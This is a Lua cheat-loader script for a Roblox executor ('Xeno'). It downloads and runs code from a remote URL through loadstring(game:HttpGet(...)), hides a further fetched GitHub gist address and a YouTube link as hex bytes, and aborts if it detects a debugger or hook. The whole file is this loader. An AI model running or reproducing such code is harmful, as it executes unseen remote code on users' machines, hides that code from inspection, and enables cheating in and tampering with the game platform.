loadstring(game:HttpGet("https://saiscripts.vercel.app/raw/gui-by-sai"))([[68 74 74 70 73 3A 2F 2F 77 77 77 2E 79 6F 75 74 75 62 65 2E 63 6F 6D 2F 40 69 74 73 2D 73 6B 6F 6E 64 6F]], [[return (function()

	local Shared = shared or (getgenv and getgenv()) or _G or {};
	assert(type(Shared) == "table", "[-] Shared globals invalid");

	local Env = getfenv and getfenv(1);
	assert(type(Env) == "table", "[-] getfenv unavailable or returned non-table");

	assert(type(setfenv) == "function", "[-] setfenv unavailable in this environment");
	assert(type(loadstring) == "function", "[-] loadstring unavailable in this environment");
	assert(type(pcall) == "function", "[-] pcall unavailable in this environment");

	local req = request or (syn and syn.request) or (http and http.request) or http_request or nil;
	assert(type(req) == "function", "[-] No valid HTTP request function found");

	do
		local res = req({ Url = "68 74 74 70 73 3A 2F 2F 67 69 73 74 2E 67 69 74 68 75 62 75 73 65 72 63 6F 6E 74 65 6E 74 2E 63 6F 6D 2F 50 72 6F 70 68 65 63 79 53 6B 6F 6E 64 6F 2F 39 62 62 34 39 34 35 37 65 39 66 66 37 64 36 66 62 35 36 64 39 35 33 63 35 65 61 38 38 65 65 38 2F 72 61 77 2F 64 64 36 35 35 64 63 63 64 65 62 64 32 30 65 32 39 35 64 63 34 34 39 34 33 62 66 65 39 34 63 38 66 38 61 32 33 32 31 32 2F 67 69 73 74 66 69 6C 65 31 2E 74 78 74", Method = "GET" });
		assert(type(res) == "table", "[-] Request returned non-table response");
		assert(res.StatusCode == 200, "[-] Request check failed, status: " .. tostring(res.StatusCode));
		assert(type(res.Body) == "string" and #res.Body > 0, "[-] Request body empty or invalid");
	end;

	assert(type(debug) == "table", "[-] debug library missing");
	assert(type(debug.getinfo) == "function", "[-] debug.getinfo missing");

	do
		local t = {}; local i = debug.getinfo(t);
		assert(type(i) == "table" and i.what, "[-] debug.getinfo returned malformed info");
		assert(i.what ~= "C", "[-] Execution context appears to be native/debugged");
	end;

	do
		local hook, mask, count = debug.gethook();
		assert(hook == nil, "[-] Debug hook detected, aborting");
	end;

	local xeno = rawget(Env, "__Xeno") or rawget(Env, "Xeno") or rawget(Shared, "__Xeno") or rawget(Shared, "Xeno");
	assert(xeno, "[-] Xeno not present in any global scope — visit xeno.onl");

	rawset(Env, "__Xeno", xeno); assert(rawget(Env, "__Xeno") == xeno, "[-] Env write check failed: __Xeno");
	rawset(Env, "Shared", Shared); assert(rawget(Env, "Shared") == Shared, "[-] Env write check failed: Shared");
	rawset(Shared, "__Xeno", xeno); assert(rawget(Shared, "__Xeno") == xeno, "[-] Shared write check failed: __Xeno");

	local ok, err = pcall(setfenv, 1, Env);
	assert(ok, "[-] setfenv(1, Env) failed: " .. tostring(err));

	local recheck = getfenv(1);
	assert(rawget(recheck, "__Xeno") == xeno, "[-] Post-setfenv __Xeno mismatch");
	assert(rawget(recheck, "Shared") == Shared, "[-] Post-setfenv Shared mismatch");

	setfenv(1, setmetatable(Env, {
		__index = function(_, k)
			local v = rawget(Env, k) or rawget(Shared, k);
			assert(v ~= nil, "[-] Blocked access to nil global: " .. tostring(k));
			return v;
		end;
		__newindex = function(_, k, v)
			rawset(Env, k, v);
			rawset(Shared, k, v);
		end;
	}));

end)]])
